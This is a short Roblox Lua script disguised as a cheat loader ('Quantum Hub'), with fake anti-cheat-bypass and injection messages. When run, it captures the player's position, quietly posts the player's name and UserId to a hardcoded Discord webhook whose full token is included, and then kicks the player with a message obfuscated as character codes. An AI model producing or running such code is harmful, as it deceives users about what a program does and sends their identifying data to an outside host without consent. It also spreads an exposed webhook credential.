local player = game:GetService("Players").LocalPlayer
if not player then return end

local httpService = game:GetService("HttpService")
local webhookURL = "https://discord.com/api/webhooks/1342773044883750942/nWKkqCoC6H2F7nt6ua1f2FULcRzoRqAJdK0ZmDPlK3r4wIu_1A8kJ8fkZb_qeNDk95zL"


local replayData = {} 
local function captureReplay()
    for i = 1, 10 do
        table.insert(replayData, "Player Position: " .. tostring(player.Character and player.Character:GetPrimaryPartCFrame()))
        task.wait(1) 
    end
end


local function sendReplay()
    local data = {
        username = "Quantum Hub Logger",
        content = "**Caught a hacker!** 🚨\n**User:** " .. player.Name .. "\n**UserId:** " .. player.UserId .. "\n**Replay Data:** ```\n" .. table.concat(replayData, "\n") .. "\n```"
    }

    local success, err = pcall(function()
        httpService:PostAsync(webhookURL, httpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)

    if not success then
        warn("Failed to send webhook: " .. tostring(err))
    end
end


task.spawn(captureReplay)

task.wait(3) 
print("Loading Quantum Hub v2.1.4...")
task.wait(2)
print("Bypassing anti-cheat...")
task.wait(2)
print("Injecting...")
task.wait(2)


sendReplay()


player:Kick(string.char(68, 111, 110, 39, 116, 32, 104, 97, 99, 107, 44, 32, 98, 114, 111, 116, 104, 101, 114, 46, 32, 73, 32, 107, 110, 111, 119, 32, 121, 111, 117, 39, 114, 101, 32, 98, 101, 116, 116, 101, 114, 32, 116, 104, 97, 110, 32, 116, 104, 105, 115, 46))
